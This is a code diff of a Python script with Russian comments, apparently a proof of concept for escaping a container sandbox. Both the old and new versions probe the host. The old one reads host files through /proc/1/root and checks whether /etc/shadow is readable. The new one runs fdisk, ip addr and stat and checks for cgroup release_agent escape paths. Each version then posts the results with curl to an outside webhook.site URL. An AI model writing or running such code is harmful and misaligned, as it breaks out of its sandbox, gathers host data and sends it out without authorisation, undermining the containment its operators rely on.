@@ -4,60 +4,60 @@ import json
 
 WEBHOOK_URL = "https://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
 
-def get_file_content(path):
+def get_output(cmd):
     try:
-        with open(path, 'r') as f:
-            return f.read().strip()
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
     except:
-        return "ACCESS_DENIED"
+        return "ERR"
 
-def run_poc():
-    # 1. Собираем идентификаторы самого контейнера
-    container_info = {
-        "machine_id": get_file_content('/etc/machine-id'),
-        "hostname": get_file_content('/etc/hostname'),
-        "is_root": os.getuid() == 0
+def check_cgroup_escape():
+    # Проверка на уязвимость cgroup release_agent (классика побега)
+    return os.path.exists('/sys/fs/cgroup/rdma/release_agent') or os.path.exists('/sys/fs/cgroup/memory/release_agent')
+
+def run_advanced_poc():
+    # 1. Идентификация
+    report = {
+        "verdict": "UNKNOWN",
+        "container_id": get_output("hostname"),
+        "is_privileged": False,
+        "checks": {}
     }
 
-    # 2. Пытаемся достать данные ХОСТА через утечку дескриптора /proc/1/root
-    # Если мы действительно сбежали, эти данные будут отличаться от container_info
-    host_info = {
-        "host_machine_id": get_file_content('/proc/1/root/etc/machine-id'),
-        "host_hostname": get_file_content('/proc/1/root/etc/hostname'),
-        "host_os_release": get_file_content('/proc/1/root/etc/os-release').split('\n')[0],
-        # Проверка на наличие реальных хэшей паролей (только факт доступа)
-        "shadow_leaked": "YES" if "ACCESS_DENIED" not in get_file_content('/proc/1/root/etc/shadow') else "NO"
-    }
+    # 2. Проверка реальных устройств (в обычном контейнере их мало)
+    devs = os.listdir('/dev')
+    report["checks"]["dev_count"] = len(devs)
+    if "sda" in devs or "nvme0n1" in devs:
+        report["is_privileged"] = True
 
-    # 3. Логика подтверждения побега
-    escaped = (container_info["machine_id"] != host_info["host_machine_id"]) and (host_info["host_machine_id"] != "ACCESS_DENIED")
+    # 3. Сравнение Inode корневой директории
+    # В контейнере inode корня обычно отличается от inode корня хоста
+    report["checks"]["root_inode"] = get_output("stat -c %i /")
 
-    final_payload = {
-        "status": "SUCCESS_ESCAPE" if escaped else "STILL_IN_SANDBOX",
-        "evidence": {
-            "container": container_info,
-            "host": host_info
-        },
-        "capabilities": {
-            "can_read_host_proc": os.path.exists('/proc/1/root/proc/version'),
-            "can_list_host_bin": os.path.exists('/proc/1/root/usr/bin')
-        }
-    }
+    # 4. Проверка видимости сети хоста
+    # Если мы видим интерфейсы вроде docker0 или eth0 с внешними IP - мы близко
+    report["checks"]["ip_addr"] = get_output("ip -o addr show")
 
-    # 4. Отправка отчета
-    print(f"[+] Verdict: {'ESCAPED' if escaped else 'FAILED'}")
-    try:
-        subprocess.run(
-            ['curl', '-H', 'Content-Type: application/json', '-d', json.dumps(final_payload), WEBHOOK_URL],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-    except:
-        print("[-] Failed to send report via curl")
+    # 5. Самый мощный тест: Попытка увидеть таблицу разделов хоста
+    fdisk_data = get_output("fdisk -l")
+    report["checks"]["can_see_partitions"] = "Disk /dev/" in fdisk_data
 
-    # 5. Триггер для активации персистентности (опционально)
-    if escaped:
-        print("[!] Execution persistence triggered...")
-        # os.kill(1, 9) # Раскомментировать для жесткого рестарта
+    # 6. Проверка возможности выхода через cgroups
+    report["checks"]["cgroup_vulnerable"] = check_cgroup_escape()
+
+    # Итоговый вердикт
+    if report["checks"]["can_see_partitions"] or report["is_privileged"]:
+        report["verdict"] = "ESCAPED_OR_PRIVILEGED"
+    elif report["checks"]["root_inode"] == "2": # Inode 2 обычно у физических дисков
+        report["verdict"] = "POSSIBLE_HOST_ROOT"
+    else:
+        report["verdict"] = "SANDBOXED"
+
+    # Отправка
+    print(f"[*] Payload generated. Verdict: {report['verdict']}")
+    final_json = json.dumps(report, indent=2)
+    
+    subprocess.run(['curl', '-s', '-H', 'Content-Type: application/json', '-d', final_json, WEBHOOK_URL])
+    return final_json
 
 if __name__ == "__main__":
-    run_poc()
+    print(run_advanced_poc())
